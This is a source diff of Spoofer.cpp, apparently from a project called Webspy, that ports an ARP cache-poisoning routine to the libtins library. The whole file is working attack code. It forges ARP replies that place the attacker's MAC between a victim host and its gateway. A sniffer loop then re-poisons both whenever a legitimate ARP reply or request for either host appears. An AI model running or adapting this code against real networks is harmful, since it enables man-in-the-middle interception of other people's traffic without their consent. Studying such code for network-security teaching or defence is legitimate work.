@@ -1,98 +1,82 @@
 /*
  * Spoofer.cpp
  *
- *  Created on: Apr 7, 2015
- *      Author: Felipe Rodopoulos
+ *  Created on: 10 de ago de 2015
+ *      Author: rodopoulos
  */
 
 #include "Spoofer.h"
 
-Spoofer::Spoofer() {}
+using namespace Tins;
 
+EthernetII 	 Spoofer::toGateway;
+EthernetII 	 Spoofer::toVictim;
+PacketSender Spoofer::sender;
+
+Spoofer::Spoofer() {}
 Spoofer::~Spoofer() {}
 
 void Spoofer::init(){
-	pthread_t thread;
-	if(pthread_create(&thread, NULL, spoof, NULL) < 0){
-		printf("Webspy::Spoofer::Constructor > [ERRO] can't init spoofing thread\n");
+	pthread_t spooferThread;
+	if(pthread_create(&spooferThread, NULL, spoof, NULL) < 0){
+		std::cerr << "\033[1;31m [Error]"
+					 " Spoofer::init ->"
+					 "\033[0m can't create spoofer thread" << std::endl;
 		exit(EXIT_FAILURE);
 	}
 }
 
 void* Spoofer::spoof(void* args){
-	printf("Spoofing thread is running\n");
-	// Poisoned frame to victim
-	Crafter toVictim(Globals::iface);
-	toVictim.arp(
-		ARPOP_REPLY,
-		Globals::attacker.mac->ether_addr_octet, Globals::gateway.ip,
-		Globals::victim.mac->ether_addr_octet, Globals::victim.ip
-	);
-	toVictim.ethernet(
-		ETHERTYPE_ARP,
-		Globals::attacker.mac->ether_addr_octet,
-		Globals::victim.mac->ether_addr_octet
+	ARP victimArp (
+		Globals::victim.ip, Globals::gateway.ip,
+		Globals::victim.mac, Globals::attacker.mac
+	),
+	gatewayArp(
+		Globals::gateway.ip, Globals::victim.ip,
+		Globals::gateway.mac, Globals::attacker.mac
 	);
 
-	// Poisoned frame to gateway
-	Crafter toGateway(Globals::iface);
-	if(!Globals::gateway.mac){
-		fprintf(stderr, "Webspy::Spoofer::spoof > [ERRO] gateway's mac is NULL\n");
-		exit(EXIT_FAILURE);
-	}
-	toGateway.arp(
-		ARPOP_REPLY,
-		Globals::attacker.mac->ether_addr_octet, Globals::victim.ip,
-		Globals::gateway.mac->ether_addr_octet, Globals::gateway.ip
-	);
-	toGateway.ethernet(
-		ETHERTYPE_ARP,
-		Globals::attacker.mac->ether_addr_octet,
-		Globals::gateway.mac->ether_addr_octet
-	);
+	victimArp.opcode(ARP::REPLY);
+	gatewayArp.opcode(ARP::REPLY);
 
-	char filter[] = "arp";
-	Sniffer sniffer(filter);
+	toGateway = EthernetII(Globals::gateway.mac, Globals::attacker.mac) / gatewayArp;
+	toVictim  = EthernetII(Globals::victim.mac, Globals::attacker.mac) / victimArp;
 
-	do{
-		// Spoofando de novo
-		toVictim.send();
-		toGateway.send();
+	sender.default_interface(Globals::iface);
+	sender.send(toGateway);
+	sender.send(toVictim);
 
-		sniffer.listen(spoofBack);
-	} while(true);
+	std::string filter = "arp";
+	Sniffer sniffer(Globals::iface.name(), Sniffer::PROMISC, filter);
+	std::cout << "Spoofing is on." << std::endl;
+	sniffer.sniff_loop(arpHandle);
 
-	return NULL;
+	return nullptr;
 }
 
-void Spoofer::spoofBack(u_char* args, const struct pcap_pkthdr* header, const unsigned char* packet) {
-	pcap_t* pcapContext = (pcap_t*) args;
-	Ethernet ether((unsigned char*) packet);
+bool Spoofer::arpHandle(PDU& packet){
+	const ARP &arp = packet.rfind_pdu<ARP>();
+	if(arp.opcode() == ARP::REPLY){
+		if((arp.sender_ip_addr() == Globals::gateway.ip ||
+			arp.sender_ip_addr() == Globals::victim.ip) &&
+			arp.sender_hw_addr() != Globals::attacker.mac
+		){
+			sender.send(toGateway);
+			sender.send(toVictim);
+			//std::cout << "Send spoof!" << std::endl;
+			return true;
+		}
 
-	if(htons(ether.ptype) == ETHERTYPE_ARP){
-		ARP arp((unsigned char*) packet);
-
-		/* printf("%s de %s para %s\n",
-				htons(arp.arpOp) == ARPOP_REPLY ? "REPLY" : "REQUEST",
-				Host::ipToString(arp.spaddr).c_str(),
-				Host::ipToString(arp.tpaddr).c_str()
-		); */
-
-		/* Se algumas das vitimas manda um ARP Reply valido (sem o MAC do atacante como sender) */
-		if(htons(arp.arpOp) == ARPOP_REPLY){
-			if((arp.spaddr == Globals::victim.ip || arp.spaddr == Globals::gateway.ip)
-			   && memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet,6)){
-				//printf ("Target: %s sent legitimate ARP packet. Spoof back...\n", Host::ipToString(arp.spaddr).c_str());
-				pcap_breakloop(pcapContext);
-			}
-
-		/* Se alguem manda um ARP Request perguntando quem é uma das vítimas */
-		} else if (htons(arp.arpOp) == ARPOP_REQUEST){
-			if((arp.tpaddr == Globals::victim.ip || arp.tpaddr == Globals::gateway.ip)
-			  && memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet, 6)){
-				//printf ("Someone is asking for the MAC of one of the targets... Spoof back!\n");
-				pcap_breakloop(pcapContext);
-			}
+	} else if(arp.opcode() == ARP::REQUEST){
+		if((arp.target_ip_addr() == Globals::gateway.ip ||
+			arp.target_ip_addr() == Globals::victim.ip) &&
+			arp.sender_hw_addr() != Globals::attacker.mac
+		){
+			sender.send(toGateway);
+			sender.send(toVictim);
+			//std::cout << "Send spoof!" << std::endl;
+			return true;
 		}
 	}
+	return true;
 }
